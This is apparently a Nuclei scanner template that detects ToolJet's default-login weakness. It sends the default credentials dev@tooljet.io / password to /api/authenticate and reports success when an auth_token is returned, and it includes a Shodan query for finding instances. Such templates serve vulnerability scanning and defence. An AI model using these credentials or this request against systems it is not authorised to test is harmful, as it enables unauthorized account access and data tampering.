http:
- attack: pitchfork
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"auth_token":'
    - '"organization_id":'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 201
    type: status
  matchers-condition: and
  payloads:
    password:
    - password
    username:
    - dev@tooljet.io
  raw:
  - 'POST /api/authenticate HTTP/2

    Host: {{Hostname}}

    Content-Type: application/json


    {"email":"{{username}}","password":"{{password}}"}

    '
id: tooljet-default-login
info:
  author: random-robbie
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: 'ToolJet contains a default login vulnerability. An attacker can obtain
    access to user accounts and access sensitive information, modify data, and/or
    execute unauthorized operations.

    '
  metadata:
    max-request: 1
    shodan-query: title:"tooljet"
    verified: true
  name: ToolJet - Default Login
  reference:
  - https://docs.tooljet.com/docs/contributing-guide/setup/docker/
  severity: high
  tags: default-login,tooljet
